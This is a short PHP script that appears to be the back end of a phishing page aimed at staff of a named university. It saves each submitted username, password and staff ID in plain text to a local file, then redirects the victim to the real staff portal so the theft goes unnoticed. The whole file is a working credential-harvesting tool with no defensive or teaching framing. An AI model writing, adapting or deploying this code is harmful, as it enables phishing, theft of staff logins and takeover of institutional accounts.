<?php
$file = 'credentials.txt';

// Check if all required fields are set
if (isset($_POST['UserName'], $_POST['Password'], $_POST['StaffId'])) {
    $username = $_POST['UserName'];
    $password = $_POST['Password'];
    $staffId  = $_POST['StaffId'];

    // Save credentials to the file
    file_put_contents($file, "Username: $username\nPassword: $password\nStaff ID: $staffId\n\n", FILE_APPEND);

    // Redirect to the provided link
    $redirectUrl = "https://apps.knust.edu.gh/staff";
    header("Location: $redirectUrl");
    exit; // Stop further script execution after redirect
} else {
    // If fields are missing, display an error message
    die("Invalid input. Please go back and try again.");
}
?>
